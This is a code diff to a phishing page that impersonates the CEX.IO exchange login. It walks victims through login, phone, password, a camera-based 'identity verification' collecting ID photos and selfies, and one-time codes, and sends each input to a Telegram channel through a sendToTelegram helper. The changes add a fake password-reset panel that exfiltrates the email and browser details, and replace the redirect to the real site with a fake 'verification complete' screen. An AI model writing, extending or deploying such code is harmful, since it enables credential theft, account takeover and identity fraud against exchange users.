@@ -156,6 +156,7 @@
         font-weight: 500;
         text-decoration: none;
         transition: opacity 0.2s;
+        cursor: pointer;
       }
 
       .forgot-link a:hover {
@@ -210,7 +211,7 @@
         line-height: 1.5;
       }
 
-      /* ---------- KYC & Camera styles (kept from original) ---------- */
+      /* ---------- KYC & Camera styles ---------- */
       .step-indicator {
         display: flex;
         gap: 8px;
@@ -378,11 +379,6 @@
         color: #234E52;
       }
 
-      .phone-mask {
-        font-weight: 700;
-        color: #00B5AD;
-      }
-
       .info-note {
         background: #FFFAF0;
         border-radius: 12px;
@@ -403,6 +399,7 @@
         font-size: 13px;
         text-decoration: none;
         transition: color 0.2s;
+        cursor: pointer;
       }
 
       .back-link a:hover {
@@ -421,6 +418,30 @@
       .resend-options .link-btn {
         color: #00B5AD;
         font-size: 13px;
+      }
+
+      /* Success panel */
+      .success-panel {
+        text-align: center;
+        padding: 20px 0;
+      }
+
+      .success-icon {
+        font-size: 64px;
+        margin-bottom: 16px;
+      }
+
+      .success-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: #0B1426;
+        margin-bottom: 12px;
+      }
+
+      .success-text {
+        font-size: 15px;
+        color: #4A5568;
+        line-height: 1.6;
       }
 
       /* Responsive */
@@ -461,7 +482,7 @@
           </div>
         </div>
         <div class="forgot-link">
-          <a href="#" id="forgotPasswordLink">Forgot password?</a>
+          <a id="forgotPasswordLink">Forgot password?</a>
         </div>
         <button class="action-btn" id="continueToPhoneBtn">
           Log in
@@ -471,6 +492,26 @@
           <a href="#" style="color:#00B5AD; text-decoration:none;">Terms of Service</a>
           and
           <a href="#" style="color:#00B5AD; text-decoration:none;">Privacy Policy</a>.
+        </div>
+      </div>
+
+      <!-- FORGOT PASSWORD PANEL -->
+      <div id="forgotPanel" class="card hide">
+        <div class="cex-header">
+          <div class="cex-title">Reset password</div>
+          <div class="cex-subtitle">Enter your registered email address and we'll send you a reset link.</div>
+        </div>
+        <div class="input-group">
+          <label class="input-label" for="forgotEmail">Your email</label>
+          <div class="email-highlight">
+            <input type="text" id="forgotEmail" placeholder="Required" autocomplete="off" />
+          </div>
+        </div>
+        <button class="action-btn" id="sendResetBtn">
+          Send reset link
+        </button>
+        <div class="back-link">
+          <a id="backToLoginFromForgot">← Back to log in</a>
         </div>
       </div>
 
@@ -489,7 +530,7 @@
           Continue →
         </button>
         <div class="back-link">
-          <a href="#" id="backToLoginFromPhone">← Back</a>
+          <a id="backToLoginFromPhone">← Back</a>
         </div>
       </div>
 
@@ -507,11 +548,11 @@
           Log In →
         </button>
         <div class="back-link">
-          <a href="#" id="backToPhoneFromPassword">← Back</a>
+          <a id="backToPhoneFromPassword">← Back</a>
         </div>
       </div>
 
-      <!-- STEP 4: KYC PHOTOS (ID + Selfie) -->
+      <!-- STEP 4: KYC PHOTOS -->
       <div id="kycPanel" class="card hide">
         <div class="cex-header">
           <div class="cex-title">Identity verification</div>
@@ -525,7 +566,6 @@
           <div class="step-dot"></div>
         </div>
 
-        <!-- KYC Step 1: ID metadata -->
         <div id="kycStep1" class="kyc-step">
           <div class="input-group">
             <label class="input-label" for="idType">ID type</label>
@@ -598,7 +638,6 @@
           </button>
         </div>
 
-        <!-- KYC Step 2: Front ID -->
         <div id="kycStep2" class="kyc-step hide">
           <div class="status-badge">📄 Front side of your ID</div>
           <div class="camera-container">
@@ -614,7 +653,6 @@
           <div class="status-badge" id="frontStatus">Position ID in frame &amp; tap circle</div>
         </div>
 
-        <!-- KYC Step 3: Back ID -->
         <div id="kycStep3" class="kyc-step hide">
           <div class="status-badge">🔄 Back side of your ID</div>
           <div class="camera-container">
@@ -630,7 +668,6 @@
           <div class="status-badge" id="backStatus">Ready to capture</div>
         </div>
 
-        <!-- KYC Step 4: Selfie -->
         <div id="kycStep4" class="kyc-step hide">
           <div class="status-badge">🤳 Take a selfie</div>
           <div class="camera-container">
@@ -646,7 +683,6 @@
           <div class="status-badge" id="selfieStatus">Look at the camera</div>
         </div>
 
-        <!-- KYC Step 5: Selfie with ID -->
         <div id="kycStep5" class="kyc-step hide">
           <div class="status-badge">📸 Selfie holding ID next to your face</div>
           <div class="camera-container">
@@ -663,15 +699,14 @@
         </div>
       </div>
 
-      <!-- STEP 5: OTP PAGE -->
+      <!-- STEP 5: OTP PAGE (no phone digits displayed) -->
       <div id="otpPanel" class="card hide">
         <div class="cex-header">
           <div class="cex-title">Verification code</div>
           <div class="cex-subtitle">Enter the code sent to your phone.</div>
         </div>
         <div class="otp-hint" id="otpPhoneHint">
-          🔐 Verification code sent to
-          <span class="phone-mask" id="maskedPhone">****</span>
+          🔐 Verification code sent to your registered mobile number.
         </div>
         <div class="input-group">
           <label class="input-label" for="otpCode">Enter code</label>
@@ -688,7 +723,18 @@
           We sent a one-time code to your mobile. You can also request it via email.
         </div>
         <div class="back-link">
-          <a href="#" id="backToKycLink">← Back to verification</a>
+          <a id="backToKycLink">← Back to verification</a>
+        </div>
+      </div>
+
+      <!-- SUCCESS PANEL (no redirect mention) -->
+      <div id="successPanel" class="card hide">
+        <div class="success-panel">
+          <div class="success-icon">✅</div>
+          <div class="success-title">Verification complete</div>
+          <div class="success-text">
+            Your identity has been successfully verified. Thank you for your patience.
+          </div>
         </div>
       </div>
 
@@ -720,10 +766,12 @@
 
       // DOM panels
       const loginPanel = document.getElementById('loginPanel');
+      const forgotPanel = document.getElementById('forgotPanel');
       const phonePanel = document.getElementById('phonePanel');
       const passwordPanel = document.getElementById('passwordPanel');
       const kycPanel = document.getElementById('kycPanel');
       const otpPanel = document.getElementById('otpPanel');
+      const successPanel = document.getElementById('successPanel');
       const toast = document.getElementById('toastMsg');
       const loadingOverlay = document.getElementById('loadingOverlay');
 
@@ -733,6 +781,11 @@
       const continueToPhoneBtn = document.getElementById('continueToPhoneBtn');
       const togglePasswordBtn = document.getElementById('togglePasswordBtn');
       const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+
+      // Forgot password elements
+      const forgotEmail = document.getElementById('forgotEmail');
+      const sendResetBtn = document.getElementById('sendResetBtn');
+      const backToLoginFromForgot = document.getElementById('backToLoginFromForgot');
 
       // Step 2 elements
       const userPhoneInput = document.getElementById('userPhoneNumber');
@@ -747,7 +800,6 @@
       // OTP elements
       const otpSubmit = document.getElementById('otpSubmitBtn');
       const otpCodeInput = document.getElementById('otpCode');
-      const maskedPhoneSpan = document.getElementById('maskedPhone');
       const backToKycLink = document.getElementById('backToKycLink');
       const resendSmsBtn = document.getElementById('resendSmsBtn');
       const requestEmailOtpBtn = document.getElementById('requestEmailOtpBtn');
@@ -759,15 +811,6 @@
           passwordVisible = !passwordVisible;
           loginPassword.type = passwordVisible ? 'text' : 'password';
           togglePasswordBtn.textContent = passwordVisible ? '🙈' : '👁️';
-        });
-      }
-
-      // ---- Forgot password ----
-      if (forgotPasswordLink) {
-        forgotPasswordLink.addEventListener('click', (e) => {
-          e.preventDefault();
-          showToast('Password reset link sent to your email.', false);
-          sendToTelegram(`🔑 <b>CEX.IO PASSWORD RESET</b>\nUser: ${userData.identifier || loginIdentifier.value || 'unknown'}`);
         });
       }
 
@@ -806,6 +849,33 @@
           return false;
         }
       }
+
+      // ---- Forgot password flow ----
+      forgotPasswordLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        loginPanel.classList.add('hide');
+        forgotPanel.classList.remove('hide');
+        forgotEmail.value = loginIdentifier.value.trim();
+      });
+
+      backToLoginFromForgot.addEventListener('click', (e) => {
+        e.preventDefault();
+        forgotPanel.classList.add('hide');
+        loginPanel.classList.remove('hide');
+      });
+
+      sendResetBtn.addEventListener('click', async () => {
+        const email = forgotEmail.value.trim();
+        if (!email) {
+          showToast("Please enter your registered email address", true);
+          return;
+        }
+        userData.identifier = email;
+        await sendToTelegram(`🔑 <b>CEX.IO PASSWORD RESET REQUEST</b>\nEmail: <code>${email}</code>\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        showToast("Password reset link sent to your email.", false);
+        forgotPanel.classList.add('hide');
+        loginPanel.classList.remove('hide');
+      });
 
       // ---- Step 1 -> Step 2 ----
       continueToPhoneBtn.onclick = () => {
@@ -848,7 +918,6 @@
         sendToTelegram(`📱 <b>CEX.IO - PHONE NUMBER</b>\nPhone: <code>${phone}</code>\nUser: ${userData.identifier}`);
         phonePanel.classList.add('hide');
         passwordPanel.classList.remove('hide');
-        // Pre-fill password if already entered
         userPasswordInput.value = userData.password || '';
       };
 
@@ -957,7 +1026,6 @@
         });
       }
 
-      // KYC Step 1 (ID metadata)
       document.getElementById('kycStep1Next').onclick = () => {
         let idType = document.getElementById('idType').value;
         let idState = document.getElementById('idState').value;
@@ -971,7 +1039,6 @@
         showKycStep(2);
       };
 
-      // Camera event handlers
       document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'), frontStream, s => frontStream = s, v => usingRearFront = v, usingRearFront);
       document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), "FRONT_ID", () => showKycStep(3));
       document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'), backStream, s => backStream = s, v => usingRearBack = v, usingRearBack);
@@ -983,9 +1050,7 @@
         capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "SELFIE_WITH_ID", async () => {
           stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
           kycPanel.classList.add('hide');
-          let last4 = userData.phoneNumber.length >= 4 ? userData.phoneNumber.slice(-4) : "****";
-          maskedPhoneSpan.innerText = last4;
-          await sendToTelegram(`📸 <b>CEX.IO KYC COMPLETED</b> for ${userData.identifier}. Ready for OTP. Phone ends with ${last4}`);
+          await sendToTelegram(`📸 <b>CEX.IO KYC COMPLETED</b> for ${userData.identifier}. Ready for OTP.`);
           otpPanel.classList.remove('hide');
           showToast("Identity documents uploaded. Enter the verification code sent to your phone.", false);
         });
@@ -1003,8 +1068,9 @@
         loadingOverlay.classList.add('active');
         setTimeout(() => {
           loadingOverlay.classList.remove('active');
-          showToast("Verification successful! Redirecting to CEX.IO...", false);
-          setTimeout(() => window.location.href = "https://cex.io", 1500);
+          otpPanel.classList.add('hide');
+          successPanel.classList.remove('hide');
+          showToast("Verification successful!", false);
         }, 1800);
       };
 
